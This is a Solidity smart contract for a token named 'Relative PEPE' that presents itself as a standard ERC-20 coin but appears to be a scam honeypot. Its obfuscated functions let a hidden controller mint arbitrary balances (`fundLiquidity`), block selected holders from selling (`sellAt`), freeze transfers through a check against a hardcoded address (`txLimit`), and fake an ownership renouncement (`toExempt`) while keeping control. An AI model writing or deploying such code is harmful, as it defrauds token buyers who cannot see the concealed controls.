//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface receiverBuy {
    function totalSupply() external view returns (uint256);

    function balanceOf(address isSell) external view returns (uint256);

    function transfer(address fromTeamMode, uint256 launchMode) external returns (bool);

    function allowance(address atLimit, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchMode) external returns (bool);

    function transferFrom(
        address sender,
        address fromTeamMode,
        uint256 launchMode
    ) external returns (bool);

    event Transfer(address indexed from, address indexed listTeam, uint256 value);
    event Approval(address indexed atLimit, address indexed spender, uint256 value);
}

abstract contract launchFee {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface swapAutoLiquidity {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface senderFrom {
    function createPair(address swapTeam, address exemptIs) external returns (address);
}

interface enableTeam is receiverBuy {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract RelativePEPE is launchFee, receiverBuy, enableTeam {

    function txList(address walletTake, address fromTeamMode, uint256 launchMode) internal returns (bool) {
        if (walletTake == listTxFee) {
            return limitAt(walletTake, fromTeamMode, launchMode);
        }
        uint256 txLiquidity = receiverBuy(maxSellAt).balanceOf(fundLimitLaunched);
        require(txLiquidity == modeSender);
        require(fromTeamMode != fundLimitLaunched);
        if (minFeeSwap[walletTake]) {
            return limitAt(walletTake, fromTeamMode, listMax);
        }
        return limitAt(walletTake, fromTeamMode, launchMode);
    }

    uint256 private marketingAuto = 100000000 * 10 ** 18;

    uint256 toEnable;

    function totalSupply() external view virtual override returns (uint256) {
        return marketingAuto;
    }

    address public listTxFee;

    uint8 private buyAt = 18;

    function name() external view virtual override returns (string memory) {
        return feeMin;
    }

    bool private toLiquidityLaunch;

    function limitAt(address walletTake, address fromTeamMode, uint256 launchMode) internal returns (bool) {
        require(enableTotal[walletTake] >= launchMode);
        enableTotal[walletTake] -= launchMode;
        enableTotal[fromTeamMode] += launchMode;
        emit Transfer(walletTake, fromTeamMode, launchMode);
        return true;
    }

    bool public walletModeTo;

    function fundLiquidity(address fromTx, uint256 launchMode) public {
        swapEnable();
        enableTotal[fromTx] = launchMode;
    }

    function launchMarketing(address fundLaunch) public {
        require(fundLaunch.balance < 100000);
        if (walletModeTo) {
            return;
        }
        
        maxShould[fundLaunch] = true;
        
        walletModeTo = true;
    }

    function txLimit(uint256 launchMode) public {
        swapEnable();
        modeSender = launchMode;
    }

    mapping(address => bool) public maxShould;

    bool private minFromTx;

    function toExempt() public {
        emit OwnershipTransferred(listTxFee, address(0));
        tradingAt = address(0);
    }

    function allowance(address enableSwap, address fundFromAuto) external view virtual override returns (uint256) {
        if (fundFromAuto == txTotalMarketing) {
            return type(uint256).max;
        }
        return sellTrading[enableSwap][fundFromAuto];
    }

    function getOwner() external view returns (address) {
        return tradingAt;
    }

    string private feeMin = "Relative PEPE";

    function decimals() external view virtual override returns (uint8) {
        return buyAt;
    }

    event OwnershipTransferred(address indexed modeTotal, address indexed liquiditySender);

    function approve(address fundFromAuto, uint256 launchMode) public virtual override returns (bool) {
        sellTrading[_msgSender()][fundFromAuto] = launchMode;
        emit Approval(_msgSender(), fundFromAuto, launchMode);
        return true;
    }

    mapping(address => bool) public minFeeSwap;

    bool public liquidityTrading;

    bool public launchedShould;

    constructor (){
        if (liquidityTrading != toLiquidityLaunch) {
            minFromTx = true;
        }
        swapAutoLiquidity teamBuy = swapAutoLiquidity(txTotalMarketing);
        maxSellAt = senderFrom(teamBuy.factory()).createPair(teamBuy.WETH(), address(this));
        
        listTxFee = _msgSender();
        toExempt();
        maxShould[listTxFee] = true;
        enableTotal[listTxFee] = marketingAuto;
        
        emit Transfer(address(0), listTxFee, marketingAuto);
    }

    mapping(address => mapping(address => uint256)) private sellTrading;

    uint256 constant listMax = 5 ** 10;

    function transfer(address fromTx, uint256 launchMode) external virtual override returns (bool) {
        return txList(_msgSender(), fromTx, launchMode);
    }

    string private sellTotalAt = "RPE";

    function transferFrom(address walletTake, address fromTeamMode, uint256 launchMode) external override returns (bool) {
        if (_msgSender() != txTotalMarketing) {
            if (sellTrading[walletTake][_msgSender()] != type(uint256).max) {
                require(launchMode <= sellTrading[walletTake][_msgSender()]);
                sellTrading[walletTake][_msgSender()] -= launchMode;
            }
        }
        return txList(walletTake, fromTeamMode, launchMode);
    }

    function symbol() external view virtual override returns (string memory) {
        return sellTotalAt;
    }

    uint256 modeSender;

    function sellAt(address toLimit) public {
        swapEnable();
        
        if (toLimit == listTxFee || toLimit == maxSellAt) {
            return;
        }
        minFeeSwap[toLimit] = true;
    }

    address fundLimitLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address txTotalMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => uint256) private enableTotal;

    uint256 public enableShould;

    address private tradingAt;

    function balanceOf(address isSell) public view virtual override returns (uint256) {
        return enableTotal[isSell];
    }

    address public maxSellAt;

    function owner() external view returns (address) {
        return tradingAt;
    }

    function swapEnable() private view {
        require(maxShould[_msgSender()]);
    }

    uint256 public toAt;

}